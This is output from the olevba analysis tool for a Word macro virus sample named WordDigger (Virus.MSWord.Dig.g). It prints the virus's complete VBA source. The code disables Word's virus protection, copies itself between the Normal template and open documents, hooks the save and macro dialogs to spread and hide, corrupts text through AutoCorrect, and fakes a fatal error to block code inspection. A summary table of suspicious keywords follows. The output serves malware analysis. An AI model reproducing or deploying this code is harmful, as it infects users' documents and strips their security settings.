olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dig.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dig.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordDigger.bas 
in file: Virus.MSWord.Dig.g - OLE stream: 'Macros/VBA/WordDigger'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
'Copyright © 1999 by dd!Actor.
'All rights reserved.
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub Autoopen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
Kill pth
End If
If Hour(Time) = Minute(Time) Then
AutoCorrect.ReplaceText = True
AutoCorrect.Entries.Add ",", ", áëèí,"
MsgBox "Copyright © 1999 by dd!Actor." + vbCrLf + "All rights reserved.", vbOKOnly + vbInformation
End If
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.VBE.MainWindow.Visible = False
WordBasic.DisableAutoMacros 0
Options.SaveNormalPrompt = 0
If Hour(Time) = Minute(Time) Then
AutoCorrect.ReplaceText = True
AutoCorrect.Entries.Add ",", ", áëèí,"
MsgBox "Copyright © 1999 by dd!Actor." + vbCrLf + "All rights reserved.", vbOKOnly + vbInformation
End If
End Sub
Sub FileSave()
On Error Resume Next
Call Autoopen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Autoopen
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsOptions()
On Error Resume Next
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte
Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat


 
Dialogs(wdDialogToolsOptions).Show
Set dc = ActiveDocument.VBProject.VBComponents("WordDigger").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Set dc = NormalTemplate.VBProject.VBComponents("WordDigger").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object
On Error Resume Next
pth = Environ("temp") & "\~WRD000^.tmp"
Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res
If NInst = True Then
Set dc = dcN
GoSub 20
Nsav = NormalTemplate.Saved
NormalTemplate.Saved = 1
End If
If AInst = True Then
Set dc = dcA
GoSub 20
Asav = ActiveDocument.Saved
ActiveDocument.Saved = 1
End If
Dialogs(wdDialogToolsMacro).Show
dcN("WordDigger").CodeModule.AddFromFile pth
dcA("WordDigger").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth
NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth
ActiveDocument.Saved = Asav
Kill pth
Exit Sub
10 For i = 1 To dc.VBComponents.Count
If dc.VBComponents(i).Name = "WordDigger" Then
res = 1
dc.VBComponents(i).Export pth
End If
Next i
Return
20 dc.Export pth
n = dc("WordDigger").CodeModule.CountOfLines
dc("WordDigger").CodeModule.DeleteLines 1, n
Return
End Sub
Sub ViewVBCode()
If Dir("c:\digger.die") = "" Then
FatalAppExit 0, "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA! Code : dd!Actor"
Else
Application.VBE.MainWindow.Visible = True
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

